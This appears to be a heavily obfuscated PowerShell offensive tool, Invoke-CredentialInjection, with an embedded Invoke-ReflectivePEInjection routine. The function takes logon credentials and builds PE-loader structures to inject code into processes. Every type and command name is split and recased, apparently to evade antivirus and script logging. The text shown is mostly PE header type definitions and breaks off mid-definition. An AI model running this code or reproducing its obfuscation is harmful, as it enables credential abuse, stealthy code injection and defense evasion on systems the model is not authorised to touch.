&("{1}{0}" -f 'ItEm','Set-')  ("Va"+"RIABLE:mw"+"6"+"Zb")  (  [tYPE]("{0}{5}{7}{6}{1}{2}{3}{4}"-f'S','ceS.uNmA','NA','gE','DtYpe','Yst','imE.iNTErOpsERvI','eM.RunT'))  ; &("{0}{2}{1}" -f 'sE','Tem','t-I')  ('var'+'i'+'A'+'Ble:Wu6t')  ( [type]("{0}{1}"-F 'IN','t32'));    &("{1}{0}{2}" -f'e','S','t-ITEM') ('V'+'ARI'+'Ab'+'LE:02cBI')  ( [tYpE]("{1}{0}" -f'OOl','B')  )  ;   &("{2}{1}{0}"-f 'eM','-IT','seT') ('vA'+'riaB'+'le:'+'K'+'U0c')  ([Type]("{1}{0}" -f 'T32','uiN') ) ;  &("{2}{0}{1}"-f'iTe','m','SEt-') ('vARi'+'Ab'+'L'+'e:fQ2bL'+'U') ([tyPE]("{0}{1}{2}"-F 'BItco','Nv','eRteR'))  ;   ${0`Om41} =  [tYPE]("{2}{1}{0}"-F'r','tPt','UiN')  ;   ${T01H`j9} =[TyPe]("{1}{0}"-f 'h','MAT');  &("{2}{0}{1}" -f '-I','TeM','Set')  ('V'+'ArI'+'aBl'+'e:hUVdb') (  [typE]("{5}{2}{3}{0}{4}{6}{7}{1}{8}" -f '.refleC','N','ST','eM','TIon.call','sY','inGC','onvENTIo','S')  ) ;   &("{2}{0}{1}"-f 'Et-ItE','M','s')  ("V"+"aRIAblE"+":"+"b92")  ([TYPe]("{1}{2}{0}" -f 'MAin','Ap','PDO')  )  ;  &("{1}{2}{0}"-f 'aBle','SET-va','Ri') ("cYu"+"w") ( [TYpE]("{4}{2}{7}{9}{5}{6}{1}{3}{8}{11}{10}{12}{0}"-F's','ssEM','reFl','B','syStem.','Emi','t.a','ECt','LYbu','ION.','aCC','iLDeR','ES'));   &("{1}{2}{0}" -f 'em','s','et-IT') ("{3}{1}{2}{0}" -f'bR','RIA','ble:kiD','Va') ( [TYpe]("{6}{7}{3}{10}{5}{9}{8}{0}{11}{1}{4}{2}"-f 'Al','T','ButE','e.','RI','TErOpsERVicES.','Sys','TEm.RunTiM','h','MARs','iN','ASaT'))  ;    &('sV')  ('zf'+'i2w'+'H')  ( [tYPe]("{9}{10}{8}{0}{4}{6}{3}{2}{5}{11}{1}{7}"-F'nTIm','ARsHA','oP','er','E.i','seRvI','nT','L','.Ru','sYsTE','m','CeS.M'));    &("{1}{0}" -f'teM','SET-I') ("{3}{2}{1}{0}" -f'Ti85','1c','IABlE:','vAR') ([tYPE]("{1}{2}{3}{0}"-F'ENt','E','n','VIroNM')) ;  &("{1}{0}" -f'T','se')  ("{1}{0}" -f 'a','BQT')  ([TYPe]("{0}{1}"-f'In','TptR')  )  ;  ${2`7BN} =[Type]("{3}{1}{4}{2}{5}{0}{6}" -F 't','THRea','IN','sySTEm.','D','g.','HreAd');  &("{1}{0}{2}" -f 'T-itE','SE','m')  ('VAr'+'iAbl'+'e:B6d'+'083')  ( [TypE]("{6}{2}{5}{4}{1}{3}{0}" -F's','T','.dIA','ICs.Proces','Os','GN','SYsTeM')  )  ; &("{1}{2}{0}" -f 'ITEm','sEt','-') ('VA'+'RIabLE:0'+'kc'+'L'+'TY') (  [typE]("{0}{2}{1}"-f'cOn','t','ver') ) ;  ${7`Mk} =  [tYpe]("{2}{1}{4}{5}{3}{0}"-F'UNiCoDeENcoDINg','Te','SyS','.','M.t','eXT');  &("{0}{1}" -f 'SE','t')  ("wds"+"Kf") ( [TYPE]("{4}{1}{3}{0}{2}"-f 'iiEN','Text.','CoDiNg','asC','SySTEm.')  )  ;function i`NV`OKE-cRe`dENtiaLi`NjeC`TiOn
{
    

    [CmdletBinding()]
    Param(
        [Parameter(ParaMETERSETNaMe = "N`ewwiNlOG`ON", pOSItion = 0)]
	    [Switch]
	    ${N`e`WwInl`OGON},

        [Parameter(pARAMEteRSeTnAme = "ExiSTI`N`gWinlO`gon", PoSitIon = 0)]
	    [Switch]
	    ${eX`i`stiNg`WinLo`GoN},

        [Parameter(POSItION=1, ManDaTory=${Tr`UE})]
        [String]
        ${DOmAin`N`AME},

        [Parameter(POSiTIon=2, mANDATORY=${tr`UE})]
        [String]
        ${u`Se`Rname},

        [Parameter(posiTION=3, MandAtORy=${T`RuE})]
        [String]
        ${p`Ass`Wo`RD},

        [Parameter()]
        [ValidateSet({"{2}{0}{1}"-f'te','ractive','In'},{"{4}{2}{3}{5}{0}{1}"-f'iv','e','emote','Intera','R','ct'}, {"{0}{1}{3}{2}" -f 'Network','C','text','lear'})]
        [String]
        ${LOg`O`Nt`Ype} = ("{3}{4}{2}{1}{0}"-f've','i','teract','R','emoteIn'),

        [Parameter()]
        [ValidateSet({"{2}{1}{0}"-f'os','rber','Ke'},{"{1}{0}"-f'v1_0','Ms'})]
        [String]
        ${A`U`Th`PACkagE} = ("{0}{1}{2}"-f'Kerbe','r','os')
    )

    &("{0}{2}{1}{3}" -f 'Set','Str','-','ictMode') -Version 2




    function iNv`oKE-`REFlec`T`IVe`PE`i`NjEcT`iON
    {
    

    [CmdletBinding()]
    Param(
	    [Parameter(MaNdaToRY = ${Tr`UE})]
	    [Byte[]]
	    ${BYT`es`32},
	
	    [Parameter(maNDatORy = ${T`RUE})]
	    [Byte[]]
	    ${ByTE`s`64},
	
	    [Parameter(poSItion = 1)]
	    [String[]]
	    ${coMP`UTErNA`me},
	
	    [Parameter(pOsITION = 2)]
        [ValidateSet( {"{0}{1}{2}"-f'W','Stri','ng'}, {"{0}{1}"-f 'St','ring'}, {"{1}{0}" -f 'd','Voi'} )]
	    [String]
	    ${FUN`C`RETUR`NTY`pe} = ("{0}{1}" -f'V','oid'),
	
	    [Parameter(PosITion = 3)]
	    [String]
	    ${EX`e`ARGS},
	
	    [Parameter(PoSiTioN = 4)]
	    [Int32]
	    ${Pr`O`cID},
	
	    [Parameter(pOSITiON = 5)]
	    [String]
	    ${PR`OCnA`me}
    )

    &("{2}{1}{0}"-f'rictMode','t-St','Se') -Version 2


    ${REM`OtE`sC`R`iP`TbloCK} = {
	    [CmdletBinding()]
	    Param(
		    [Parameter(PoSiTIOn = 0, mandAtOry = ${t`Rue})]
		    [Byte[]]
		    ${pE`BYt`ES},
		
		    [Parameter(pOSiTIon = 1, MANDaTORY = ${f`A`lsE})]
		    [String]
		    ${fu`N`cRetu`RNType},
				
		    [Parameter(PoSITiOn = 2, MaNDAtoRY = ${F`Al`se})]
		    [Int32]
		    ${PrO`CId},
		
		    [Parameter(POSItION = 3, mAndATORy = ${F`ALsE})]
		    [String]
		    ${Pr`O`cnamE}
	    )
	
	    
	    
	    
	    Function Get`-`WIn32`Ty`pes
	    {
		    ${wiN32`Typ`eS} = &("{0}{1}{2}" -f 'New-','Objec','t') ("{1}{0}{2}{3}"-f 'stem.Obj','Sy','e','ct')

		    
		    
		    ${DoMa`iN} =  ${B`92}::"curRE`NTd`OMaIn"
		    ${DY`NAMi`caS`sem`BLY} = &("{0}{2}{1}"-f'Ne','-Object','w') ("{8}{7}{0}{9}{4}{5}{2}{3}{6}{1}"-f '.','ame','.As','sembl','c','tion','yN','stem','Sy','Refle')(("{1}{3}{0}{2}"-f'l','DynamicAss','y','emb'))
		    ${a`ss`EM`B`lYBuiLdER} = ${DOM`A`iN}.("{4}{2}{5}{3}{0}{1}"-f'mi','cAssembly','e','yna','Defin','D').Invoke(${D`yNAm`IcassEmB`LY},  ${c`YUW}::"R`UN")
		    ${MOduL`e`Bui`LdER} = ${As`s`EmBLybu`Il`d`er}.("{2}{0}{3}{1}{4}"-f 'e','odu','D','fineDynamicM','le').Invoke(("{3}{0}{1}{2}" -f'cM','odul','e','Dynami'), ${f`ALSE})
		    ${CoN`STRuC`TORI`N`Fo} =   (  &("{1}{3}{0}{2}" -f'iabl','gEt-','e','vaR')  ('k'+'IDbr') -va ).("{2}{3}{1}{4}{0}" -f 'ructors','Cons','G','et','t').Invoke()[0]


		    
		    
		    ${tY`PebU`IlDeR} = ${M`OdU`lebUiLDER}.("{2}{0}{1}" -f 'ine','Enum','Def').Invoke(("{2}{0}{1}"-f'achine','Type','M'), ("{1}{0}"-f 'lic','Pub'), [UInt16])
		    ${t`yp`E`BUILdER}.("{0}{2}{1}"-f 'Def','l','ineLitera').Invoke(("{0}{1}"-f 'Nati','ve'), [UInt16] 0) | &("{1}{0}"-f'l','Out-Nul')
		    ${TyPeb`U`ILdER}.("{3}{0}{4}{2}{1}"-f 'ne','eral','t','Defi','Li').Invoke(("{0}{1}" -f'I','386'), [UInt16] 0x014c) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		    ${TyP`ebU`I`LDer}.("{4}{1}{2}{0}{3}" -f 'eLit','fi','n','eral','De').Invoke(("{1}{0}"-f 'ium','Itan'), [UInt16] 0x0200) | &("{0}{2}{1}" -f 'Out','Null','-')
		    ${T`Y`PEBui`LdER}."D`e`F`inEL`iteRal"('x64', [UInt16] 0x8664) | &("{1}{0}" -f'ull','Out-N')
		    ${MAc`HINE`Type} = ${tyP`E`B`UiLDER}.("{2}{1}{0}{3}"-f'ateTy','e','Cr','pe').Invoke()
		    ${W`I`N32t`YpES} | &("{1}{0}{2}"-f 'd-Memb','Ad','er') -MemberType ("{1}{2}{0}"-f'rty','Note','Prope') -Name ("{0}{3}{1}{2}" -f 'Ma','i','neType','ch') -Value ${M`AcHiNe`TYPe}

		    
		    ${tYpebUi`L`DeR} = ${m`O`DULEbUil`d`eR}.("{0}{2}{1}" -f'D','num','efineE').Invoke(("{1}{2}{0}"-f 'gicType','M','a'), ("{0}{1}"-f 'Publ','ic'), [UInt16])
		    ${T`ypE`B`UIldER}.("{0}{2}{1}" -f 'De','Literal','fine').Invoke(("{1}{6}{3}{0}{4}{2}{5}"-f'ONA','IMAGE_','_HDR32_','OPTI','L','MAGIC','NT_'), [UInt16] 0x10b) | &("{0}{2}{1}"-f'Out','ll','-Nu')
		    ${t`ypE`Bu`ilDer}.("{2}{0}{3}{1}{4}" -f 'neLi','er','Defi','t','al').Invoke(("{0}{1}{3}{2}{4}{5}"-f'I','M','_HDR64_MA','AGE_NT_OPTIONAL','GI','C'), [UInt16] 0x20b) | &("{2}{0}{1}" -f 'ut','-Null','O')
		    ${MAG`iC`TYPE} = ${TYpe`BUiL`d`Er}.("{0}{1}{2}" -f 'Cr','eat','eType').Invoke()
		    ${win32`T`y`pES} | &("{2}{0}{1}"-f '-','Member','Add') -MemberType ("{2}{0}{1}{3}" -f 'ote','Pr','N','operty') -Name ("{1}{0}" -f 'Type','Magic') -Value ${Ma`g`iCtyPE}

		    
		    ${tYPEB`UI`Ld`ER} = ${Mo`dule`BUIld`Er}.("{2}{3}{0}{1}"-f 'n','um','Defi','neE').Invoke(("{1}{4}{0}{2}{3}" -f 'e','SubSy','mTy','pe','st'), ("{1}{0}"-f'lic','Pub'), [UInt16])
		    ${T`Y`PeBUiLDeR}.("{0}{1}{2}" -f'D','efineLit','eral').Invoke(("{2}{0}{3}{1}{5}{4}" -f 'UBS','TEM_U','IMAGE_S','YS','N','NKNOW'), [UInt16] 0) | &("{1}{0}"-f '-Null','Out')
		    ${TY`P`ebUIldER}.("{2}{1}{0}" -f'l','a','DefineLiter').Invoke(("{0}{3}{1}{4}{2}"-f'IMA','SYSTEM','VE','GE_SUB','_NATI'), [UInt16] 1) | &("{2}{1}{0}" -f'ull','-N','Out')
		    ${t`Yp`e`BUiLdER}.("{4}{1}{0}{3}{2}" -f'e','fineLit','al','r','De').Invoke(("{1}{3}{0}{2}{4}" -f'N','IMAGE_SUBSYST','DOWS_GU','EM_WI','I'), [UInt16] 2) | &("{1}{0}" -f'Null','Out-')
		    ${t`Y`p`EBUiLdEr}.("{2}{0}{1}"-f'e','ral','DefineLit').Invoke(("{2}{3}{1}{0}{5}{4}" -f'SYSTEM_WI','UB','IMAGE_','S','CUI','NDOWS_'), [UInt16] 3) | &("{2}{0}{1}"-f'ut','-Null','O')
		    ${TYPe`Bu`ilD`eR}.("{1}{2}{3}{0}"-f 'teral','De','fine','Li').Invoke(("{6}{4}{0}{3}{1}{2}{5}"-f 'SYST','M_PO','SIX_','E','AGE_SUB','CUI','IM'), [UInt16] 7) | &("{1}{0}"-f 'l','Out-Nul')
		    ${T`YPEbuiLd`eR}.("{3}{1}{0}{2}"-f 'ra','eLite','l','Defin').Invoke(("{5}{0}{3}{4}{1}{2}" -f'A','CE','_GUI','GE_','SUBSYSTEM_WINDOWS_','IM'), [UInt16] 9) | &("{1}{0}"-f 'll','Out-Nu')
		    ${t`YpeBuI`lD`ER}.("{2}{0}{1}"-f 'Lite','ral','Define').Invoke(("{1}{3}{6}{4}{2}{5}{0}" -f'N','IMAGE_SU','_APP','BS','EM_EFI','LICATIO','YST'), [UInt16] 10) | &("{1}{0}" -f '-Null','Out')
		    ${tyP`eB`UiLd`eR}.("{1}{3}{2}{0}" -f'eral','De','Lit','fine').Invoke(("{2}{1}{4}{6}{5}{3}{0}" -f 'VER','E_SUBSY','IMAG','RVICE_DRI','ST','OOT_SE','EM_EFI_B'), [UInt16] 11) | &("{1}{0}{2}"-f'-Nul','Out','l')
		    ${TypEb`U`Ilder}.("{2}{4}{1}{3}{0}" -f'eral','eL','De','it','fin').Invoke(("{1}{0}{4}{3}{2}{8}{7}{5}{6}"-f 'SU','IMAGE_','T','S','BSY','_RUNTIME_DRIVE','R','EFI','EM_'), [UInt16] 12) | &("{0}{2}{1}"-f'Out-Nu','l','l')
		    ${t`YpeBUild`Er}.("{0}{2}{3}{1}" -f'De','teral','f','ineLi').Invoke(("{4}{3}{2}{0}{1}" -f'_','EFI_ROM','M','E','IMAGE_SUBSYST'), [UInt16] 13) | &("{1}{2}{0}"-f 'Null','O','ut-')
		    ${T`YpEBUI`L`dER}.("{0}{1}{3}{2}{4}" -f'De','fi','Litera','ne','l').Invoke(("{4}{0}{5}{3}{2}{1}"-f'GE','X','TEM_XBO','S','IMA','_SUBSY'), [UInt16] 14) | &("{0}{1}"-f 'Out-Nu','ll')
		    ${Su`BS`YSte`m`TYPE} = ${TyP`E`Bu`ildeR}.("{1}{2}{0}" -f'e','Creat','eTyp').Invoke()
		    ${W`IN32T`YP`eS} | &("{2}{1}{0}"-f 'mber','e','Add-M') -MemberType ("{2}{0}{1}" -f'ert','y','NoteProp') -Name ("{2}{0}{3}{1}"-f 'emT','pe','SubSyst','y') -Value ${Sub`s`Yst`emTYPe}

		    
		    ${tYp`eBUiL`D`er} = ${M`odULE`BUILDer}.("{1}{0}{2}{3}"-f'eE','Defin','nu','m').Invoke(("{2}{1}{3}{4}{0}" -f'csType','ar','DllCh','act','eristi'), ("{1}{0}"-f 'ic','Publ'), [UInt16])
		    ${tY`pebU`il`dER}.("{4}{1}{2}{3}{0}" -f 'al','f','i','neLiter','De').Invoke(("{0}{1}"-f'R','ES_0'), [UInt16] 0x0001) | &("{2}{0}{1}"-f 'N','ull','Out-')
		    ${T`y`pEBUILD`eR}.("{1}{2}{3}{0}" -f 'neLiteral','D','e','fi').Invoke(("{1}{0}"-f'1','RES_'), [UInt16] 0x0002) | &("{0}{2}{1}" -f'O','ll','ut-Nu')
		    ${tY`PEb`UIldEr}.("{4}{3}{2}{0}{1}" -f 'Litera','l','ine','ef','D').Invoke(("{0}{1}"-f 'R','ES_2'), [UInt16] 0x0004) | &("{1}{0}{2}" -f'-N','Out','ull')
		    ${T`ypEBu`ilD`eR}.("{0}{1}{2}{3}" -f 'Def','i','ne','Literal').Invoke(("{1}{0}" -f 'S_3','RE'), [UInt16] 0x0008) | &("{2}{0}{1}" -f'-Nul','l','Out')
		    ${T`yPebuILD`er}.("{3}{2}{4}{0}{1}"-f 'eLi','teral','efi','D','n').Invoke(("{9}{10}{8}{2}{5}{4}{7}{6}{1}{0}{3}" -f 'BA','_','ACTE','SE','S_','RISTIC','AMIC','DYN','AR','IMAGE_DLL_C','H'), [UInt16] 0x0040) | &("{1}{2}{0}"-f'Null','Out','-')
		    ${tyP`eb`UIlD`er}.("{1}{0}{3}{2}" -f'efineLit','D','al','er').Invoke(("{1}{6}{3}{5}{2}{0}{7}{4}"-f 'CS_FORC','IMAGE_','TERISTI','_CHAR','TEGRITY','AC','DLL','E_IN'), [UInt16] 0x0080) | &("{1}{0}{2}"-f '-','Out','Null')
		    ${TYp`ebUIl`D`eR}.("{1}{2}{4}{0}{3}" -f'ter','Define','L','al','i').Invoke(("{4}{5}{2}{0}{6}{3}{1}"-f'ST','COMPAT','RACTERI','S_NX_','IMA','GE_DLL_CHA','IC'), [UInt16] 0x0100) | &("{0}{2}{1}"-f'Out-Nu','l','l')
		    ${t`Ype`BUi`LdeR}.("{0}{1}{3}{2}"-f'D','efin','l','eLitera').Invoke(("{2}{0}{1}{5}{4}{6}{3}" -f 'MAGE_DLLC','HARAC','I','TION','TICS_N','TERIS','O_ISOLA'), [UInt16] 0x0200) | &("{1}{2}{0}" -f'l','Ou','t-Nul')
		    ${tYP`e`BUiLdeR}.("{0}{1}{2}{3}" -f 'Def','ine','L','iteral').Invoke(("{5}{1}{7}{4}{3}{2}{6}{0}" -f'EH','LCH','C','TI','RIS','IMAGE_DL','S_NO_S','ARACTE'), [UInt16] 0x0400) | &("{1}{0}" -f 'Null','Out-')
		    ${T`yPEb`UiLdEr}.("{0}{1}{2}"-f 'Def','ineLi','teral').Invoke(("{7}{6}{9}{5}{0}{8}{2}{3}{1}{4}" -f'AC','O','RISTICS_','N','_BIND','E_DLLCHAR','M','I','TE','AG'), [UInt16] 0x0800) | &("{1}{2}{0}" -f 'll','Out','-Nu')
		    ${Typ`E`B`UiLdEr}.("{1}{0}{2}"-f 'eL','Defin','iteral').Invoke(("{1}{0}" -f'4','RES_'), [UInt16] 0x1000) | &("{0}{1}{2}"-f'Out','-N','ull')
		    ${T`Yp`EBUi`lder}.("{1}{2}{3}{0}"-f'l','Define','L','itera').Invoke(("{3}{7}{5}{6}{4}{0}{2}{1}"-f 'WD','R','M_DRIVE','IMAG','CTERISTICS_','_DL','LCHARA','E'), [UInt16] 0x2000) | &("{2}{0}{1}" -f 'ut-','Null','O')
		    ${tYPEb`UI`l`Der}.("{2}{1}{3}{0}"-f'ral','efi','D','neLite').Invoke(("{2}{8}{7}{5}{9}{6}{4}{0}{3}{1}"-f'VE','RE','IMAGE_DLLC','R_AWA','NAL_SER','I','MI','ARACTER','H','STICS_TER'), [UInt16] 0x8000) | &("{0}{2}{1}" -f'Ou','-Null','t')
		    ${DLlCH`AR`AcTEri`S`T`ICstYpE} = ${TYP`e`BUi`LDeR}.("{2}{0}{1}" -f 'yp','e','CreateT').Invoke()
		    ${w`in32`Typ`eS} | &("{1}{0}{2}"-f 'd','A','d-Member') -MemberType ("{0}{2}{1}" -f'N','operty','otePr') -Name ("{5}{4}{0}{1}{2}{3}"-f'racte','ris','t','icsType','ha','DllC') -Value ${D`LLc`H`ArAC`TerISTICsT`ype}

		    
		    
		    ${aTt`RIBu`Tes} = ("{9}{7}{2}{8}{1}{5}{10}{0}{14}{6}{4}{3}{11}{12}{13}" -f ' Publi','AnsiCl','u','ealed, B','ExplicitLayout, S','ass, Clas',' ','oLayo','t, ','Aut','s,','eforeFi','el','dInit','c,')
		    ${TYpE`BU`i`lDeR} = ${Mod`ULE`BuilDer}.("{1}{0}{2}"-f 'efineTyp','D','e').Invoke(("{4}{3}{0}{2}{1}{5}"-f'_DA','_DI','TA','AGE','IM','RECTORY'), ${A`T`TRiBuTEs}, [System.ValueType], 8)
		    (${T`yPE`B`UiLDeR}.("{1}{0}{2}"-f'eF','Defin','ield').Invoke(("{2}{1}{0}" -f'ddress','tualA','Vir'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{1}{3}{0}{2}" -f 'tOffs','S','et','e').Invoke(0) | &("{1}{0}{2}" -f'ut-','O','Null')
		    (${tYP`EbUiL`der}.("{1}{2}{0}"-f 'ield','Def','ineF').Invoke(("{1}{0}"-f 'e','Siz'), [UInt32], ("{2}{1}{0}"-f'ic','bl','Pu'))).("{0}{2}{1}" -f 'Set','t','Offse').Invoke(4) | &("{0}{1}"-f'Ou','t-Null')
		    ${IMa`ge_`da`Ta_DIR`eCtoRY} = ${tY`p`ebui`lDer}.("{1}{2}{0}" -f'eateType','C','r').Invoke()
		    ${win`32t`YP`ES} | &("{2}{1}{0}"-f'ber','m','Add-Me') -MemberType ("{2}{0}{1}{3}"-f 'oteProp','er','N','ty') -Name ("{2}{3}{6}{1}{0}{4}{5}" -f'RE','TA_DI','IMAGE','_','CT','ORY','DA') -Value ${IMAGE`_DATA_di`Re`CTo`RY}

		    
		    ${attribU`T`ES} = ("{0}{1}{7}{11}{5}{6}{9}{10}{4}{8}{3}{13}{2}{14}{12}" -f'AutoLay','out','BeforeFie','le',' Sequ','a','ss,',', ','entialLayout, Sea',' Class,',' Public,','AnsiCl','t','d, ','ldIni')
		    ${t`YPebUi`ld`ER} = ${Mod`UleBui`l`d`er}.("{1}{2}{0}"-f'pe','Def','ineTy').Invoke(("{3}{0}{4}{2}{1}" -f 'MA','HEADER','E_','I','GE_FIL'), ${ATTRIb`U`T`es}, [System.ValueType], 20)
		    ${TY`pE`B`UIldeR}.("{1}{0}{2}{3}"-f'in','Def','eFi','eld').Invoke(("{2}{0}{1}" -f'chi','ne','Ma'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{0}{2}{1}"-f'Ou','-Null','t')
		    ${typE`B`UIl`DEr}.("{0}{2}{3}{1}"-f 'De','d','fi','neFiel').Invoke(("{1}{4}{3}{0}{2}"-f'c','Num','tions','Se','berOf'), [UInt16], ("{1}{2}{0}"-f'c','Publ','i')) | &("{2}{0}{1}"-f'ut','-Null','O')
		    ${TY`pEB`UIlD`ER}.("{0}{2}{1}{3}"-f 'Defi','e','n','Field').Invoke(("{2}{3}{1}{0}"-f 'eStamp','eDat','Ti','m'), [UInt32], ("{0}{1}" -f 'Pu','blic')) | &("{1}{0}{2}" -f 'ut','O','-Null')
		    ${ty`P`EbuILdeR}.("{2}{1}{0}" -f'ield','efineF','D').Invoke(("{1}{2}{3}{4}{0}"-f'ymbolTable','P','o','int','erToS'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{1}{0}"-f'ut-Null','O')
		    ${tYpE`B`UiLD`er}.("{2}{1}{0}"-f 'ield','neF','Defi').Invoke(("{2}{4}{3}{1}{0}"-f'mbols','y','Num','rOfS','be'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{1}{0}"-f'ull','Out-N')
		    ${ty`P`ebuildeR}.("{0}{2}{1}"-f 'Defi','eField','n').Invoke(("{2}{3}{1}{0}"-f 'ader','lHe','SizeOfOpti','ona'), [UInt16], ("{1}{0}" -f 'ic','Publ')) | &("{1}{0}"-f'Null','Out-')
		    ${tYp`EbUi`l`dEr}.("{3}{2}{0}{1}"-f 'ie','ld','ineF','Def').Invoke(("{0}{1}{3}{2}{4}"-f'C','ha','eristi','ract','cs'), [UInt16], ("{1}{0}"-f 'ic','Publ')) | &("{1}{0}"-f'll','Out-Nu')
		    ${IMaG`E_F`I`LE_hEadEr} = ${T`yp`EBUi`ldER}.("{1}{2}{0}"-f'pe','Create','Ty').Invoke()
		    ${wiN`32t`ypES} | &("{1}{0}{2}" -f'embe','Add-M','r') -MemberType ("{0}{2}{1}" -f'NotePro','rty','pe') -Name ("{3}{1}{0}{2}" -f'LE_HEAD','MAGE_FI','ER','I') -Value ${i`MA`Ge`_FiLE_HEad`er}

		    
		    ${aT`T`RI`BuTEs} = ("{2}{3}{10}{13}{7}{5}{11}{1}{4}{9}{0}{8}{6}{12}"-f 'L','ass, P','A','utoL','ublic, E','Class, C',', BeforeFiel','i','ayout, Sealed','xplicit','ayout','l','dInit',', Ans')
		    ${TYpeB`Ui`l`DeR} = ${mODul`ebu`I`LDER}.("{0}{3}{1}{2}" -f 'Def','eTy','pe','in').Invoke(("{2}{0}{4}{1}{3}"-f'OPT','NAL_HEADER','IMAGE_','64','IO'), ${a`T`TR`iBUTes}, [System.ValueType], 240)
		    (${TypEbUil`d`eR}.("{3}{1}{2}{0}"-f'ld','e','Fie','Defin').Invoke(("{0}{1}"-f'Ma','gic'), ${m`AG`ICTYPe}, ("{1}{0}" -f'c','Publi'))).("{0}{1}{2}"-f'SetO','ff','set').Invoke(0) | &("{0}{1}{2}" -f'Out-N','ul','l')
		    (${typ`ebUiL`D`er}.("{2}{3}{1}{0}"-f 'd','l','DefineF','ie').Invoke(("{0}{2}{3}{1}"-f'Major','sion','Linke','rVer'), [Byte], ("{1}{0}"-f 'c','Publi'))).("{2}{1}{0}" -f't','ffse','SetO').Invoke(2) | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
		    (${TYpE`BUil`dER}.("{2}{0}{1}{3}" -f'in','eF','Def','ield').Invoke(("{0}{1}{3}{2}"-f'Mino','rLinke','Version','r'), [Byte], ("{1}{0}"-f'ic','Publ'))).("{1}{2}{0}"-f 'fset','Set','Of').Invoke(3) | &("{0}{1}" -f'Out-Nu','ll')
		    (${T`yPE`B`UIldER}.("{2}{0}{1}" -f'ineFiel','d','Def').Invoke(("{2}{1}{0}"-f 'de','zeOfCo','Si'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).("{2}{0}{1}" -f 'f','fset','SetO').Invoke(4) | &("{1}{0}" -f '-Null','Out')
		    (${t`y`PEbUi`LDeR}.("{0}{3}{2}{1}" -f 'D','eld','i','efineF').Invoke(("{4}{2}{1}{5}{3}{0}"-f 'a','ali','iti','at','SizeOfIn','zedD'), [UInt32], ("{0}{2}{1}" -f'Pu','c','bli'))).("{1}{0}"-f't','SetOffse').Invoke(8) | &("{0}{1}{2}"-f'Out-N','u','ll')
		    (${TY`Peb`UIlder}.("{1}{2}{0}"-f 'ield','Defi','neF').Invoke(("{1}{2}{7}{5}{3}{0}{4}{6}"-f 'dDa','SizeOf','U','ze','t','initiali','a','n'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{2}{0}{1}" -f 'e','t','SetOffs').Invoke(12) | &("{1}{2}{0}"-f'l','Out-N','ul')
		    (${TYP`E`B`UilDer}.("{0}{2}{1}" -f 'D','ld','efineFie').Invoke(("{0}{2}{1}{3}"-f 'Addre','En','ssOf','tryPoint'), [UInt32], ("{0}{1}"-f 'Publ','ic'))).("{2}{1}{0}"-f'fset','f','SetO').Invoke(16) | &("{1}{0}"-f 'll','Out-Nu')
		    (${t`ypeB`UIl`DER}.("{2}{0}{1}" -f 'in','eField','Def').Invoke(("{3}{1}{0}{2}"-f'fCod','seO','e','Ba'), [UInt32], ("{0}{1}" -f'Publi','c'))).("{1}{0}" -f'etOffset','S').Invoke(20) | &("{1}{0}" -f'ut-Null','O')
		    (${T`YPEBUi`l`DEr}.("{2}{1}{0}" -f'ld','Fie','Define').Invoke(("{0}{2}{1}" -f'Ima','Base','ge'), [UInt64], ("{0}{1}" -f'P','ublic'))).("{1}{2}{0}{3}" -f'ff','Set','O','set').Invoke(24) | &("{2}{0}{1}"-f'ut-','Null','O')
		    (${T`y`peBU`ilDer}.("{1}{0}{2}" -f'fineFi','De','eld').Invoke(("{3}{1}{0}{2}"-f'g','onAli','nment','Secti'), [UInt32], ("{1}{0}" -f'ublic','P'))).("{2}{0}{1}"-f'ffse','t','SetO').Invoke(32) | &("{2}{0}{1}"-f 'l','l','Out-Nu')
		    (${T`yPE`BUILDer}.("{2}{1}{0}" -f'eld','eFi','Defin').Invoke(("{1}{0}{2}"-f 'eAl','Fil','ignment'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{1}{2}{0}"-f 't','SetOf','fse').Invoke(36) | &("{2}{1}{0}"-f'ull','N','Out-')
		    (${t`YP`ebUild`Er}.("{0}{2}{1}" -f'Define','d','Fiel').Invoke(("{0}{5}{4}{1}{2}{3}" -f'M','s','temVer','sion','OperatingSy','ajor'), [UInt16], ("{2}{1}{0}"-f 'c','i','Publ'))).("{1}{2}{0}"-f 't','SetOf','fse').Invoke(40) | &("{0}{1}{2}" -f'Out-N','ul','l')
		    (${Ty`PEBUIlD`Er}.("{1}{0}{2}{3}" -f 'ineF','Def','iel','d').Invoke(("{0}{5}{3}{4}{1}{2}"-f'MinorO','si','on','stemVe','r','peratingSy'), [UInt16], ("{0}{1}"-f 'Publ','ic'))).("{0}{2}{1}"-f'SetOff','et','s').Invoke(42) | &("{2}{1}{0}"-f'l','ut-Nul','O')
		    (${TYpEb`U`iLD`Er}.("{0}{1}{2}{3}" -f 'Def','i','neF','ield').Invoke(("{0}{2}{1}{3}" -f 'MajorIma','eV','g','ersion'), [UInt16], ("{1}{0}"-f'ublic','P'))).("{1}{0}{2}"-f's','SetOff','et').Invoke(44) | &("{1}{0}" -f'll','Out-Nu')
		    (${t`Yp`Eb`UiLdER}.("{0}{3}{1}{2}" -f'D','fineFiel','d','e').Invoke(("{4}{0}{3}{1}{2}"-f 'rImag','rsi','on','eVe','Mino'), [UInt16], ("{1}{0}{2}"-f 'u','P','blic'))).("{2}{0}{1}" -f'e','tOffset','S').Invoke(46) | &("{0}{2}{1}" -f 'O','-Null','ut')
		    (${Type`Bui`lD`Er}.("{0}{2}{1}"-f'Defin','d','eFiel').Invoke(("{5}{2}{3}{1}{0}{4}"-f'si','stemVer','Subs','y','on','Major'), [UInt16], ("{2}{0}{1}" -f 'u','blic','P'))).("{0}{1}{2}"-f 'SetOffs','e','t').Invoke(48) | &("{0}{2}{1}" -f 'Out','Null','-')
